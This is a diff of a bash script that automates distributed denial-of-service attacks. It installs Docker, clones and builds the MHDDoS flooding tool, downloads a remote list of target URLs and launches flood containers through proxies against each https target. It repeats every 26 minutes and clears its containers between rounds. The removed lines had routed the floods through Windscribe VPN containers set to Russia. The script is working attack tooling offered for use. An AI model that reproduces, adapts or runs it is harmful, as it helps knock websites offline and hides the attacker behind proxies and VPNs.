@@ -1,18 +1,12 @@
 #!/bin/bash -x
 
-TIME="15s"
+proxyFile="proxy1"
 
-while getopts 'u:p:f:' flag; do
+while getopts 'f:' flag; do
   case "${flag}" in
-    u) windscribeUserName=${OPTARG};;
-    p) windscribePassword=${OPTARG};;
     f) fileName=${OPTARG};;
   esac
 done
-
-echo $windscribeUserName
-echo $windscribePassword
-echo $fileName
 
 if [ -x "$(command -v docker)" ]; then
     echo "Docker installed"
@@ -38,41 +32,41 @@ else
   apt-get -y install docker-ce docker-ce-cli containerd.io
 fi
 
-
+if [ ! -d "/root/MHDDoS" ]; then
+  git clone https://github.com/MHProDev/MHDDoS.git
+  cd /root/MHDDoS && touch proxy.txt && docker build -t mhddos_rv .
+  cd ..
+fi
 
 while :
 do
 
-  docker run --name vpn1 -e PUID=1000 -e PGID=1000 -e WINDSCRIBE_USERNAME=$windscribeUserName -e WINDSCRIBE_PASSWORD=$windscribePassword -e WINDSCRIBE_LOCATION=RU -e VPN_PORT=8080 --dns 8.8.8.8 --cap-add NET_ADMIN --restart unless-stopped -d wiorca/docker-windscribe
+  # docker run --name vpn1 -e PUID=1000 -e PGID=1000 -e WINDSCRIBE_USERNAME=$windscribeUserName -e WINDSCRIBE_PASSWORD=$windscribePassword -e WINDSCRIBE_LOCATION=RU -e VPN_PORT=8080 -e WINDSCRIBE_FIREWALL=off --dns 8.8.8.8 --cap-add NET_ADMIN --restart unless-stopped -d wiorca/docker-windscribe
+  # docker run --name vpn2 -e PUID=1001 -e PGID=1001 -e WINDSCRIBE_USERNAME=$windscribeUserName -e WINDSCRIBE_PASSWORD=$windscribePassword -e WINDSCRIBE_LOCATION=RU -e VPN_PORT=8080 -e WINDSCRIBE_FIREWALL=off --dns 8.8.8.8 --cap-add NET_ADMIN --restart unless-stopped -d wiorca/docker-windscribe
+  # sleep 1m
 
   wget -O list.txt $fileName
   myarray=(`cat list.txt`)
   noofelements=${#myarray[*]}
   counter=0
-  counterGroup=0
-  execCommand=""
+  randVpn="vpn1"
   while [ $counter -lt $noofelements ]
   do
-    execCommand+=" ${myarray[$counter]}"
+
+    if [[ "${myarray[$counter]}" == https* ]]; then
+
+        docker run -it --rm -d mhddos_rv EVEN ${myarray[$counter]} 1 300 /app/$proxyFile.txt 200 1600 --debug
+
+        if [ "$randVpn" == "vpn1" ]; then
+            randVpn="vpn2"
+        else
+            randVpn="vpn1"
+        fi
+    fi
     counter=$(( $counter + 1 ))
-    counterGroup=$(( $counterGroup + 1 ))
-
-    randVpn=${vpns[RANDOM%2]}
-
-    if [[ "$counterGroup" -eq 5 ]]; then
-      counterGroup=0
-      docker run --net=container:vpn1 -it --rm portholeascend/mhddos_proxy${execCommand}
-      execCommand=""
-    fi
-
-    if [[ ${myarray[$counter]} == ${myarray[-1]} ]]; then
-      counterGroup=0
-      docker run --net=container:vpn1 -it --rm portholeascend/mhddos_proxy${execCommand}
-      execCommand=""
-    fi
   done
 
-  sleep 15m
+  sleep 26m
 
   docker rm -f $(docker ps -aq) >/dev/null 2>&1 || true
 done
